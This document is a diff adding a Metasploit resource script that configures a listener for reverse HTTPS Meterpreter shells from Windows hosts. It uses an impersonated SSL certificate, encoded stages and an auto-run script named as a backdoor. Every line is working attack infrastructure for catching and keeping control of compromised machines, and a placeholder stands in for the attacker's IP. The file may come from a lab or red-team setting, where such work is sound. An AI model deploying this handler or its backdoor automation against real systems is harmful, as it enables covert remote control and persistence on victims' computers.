@@ -1,0 +1,16 @@
+workspace nglab
+#this will create a multihandler session to listen to the reverse shell created by msfvenom
+# setg will set the given parameter globally
+use exploit/multi/handler
+#setg is for global variables
+setg PAYLOAD windows/x64/meterpreter/reverse_https
+setg LHOST {YOUR IP ADDRESS}
+set LPORT 8445
+setg stagerverifysslcert true
+setg HandlerSSLCert {path to impersonate_ssl file}
+setg EnableStageEncoding true
+setg ExitOnSession false
+set AutoRunScript multi_console_command -r {path to this folder}/autorun_backdoor.rc
+# run the exploit as a job in the background
+exploit -j
+
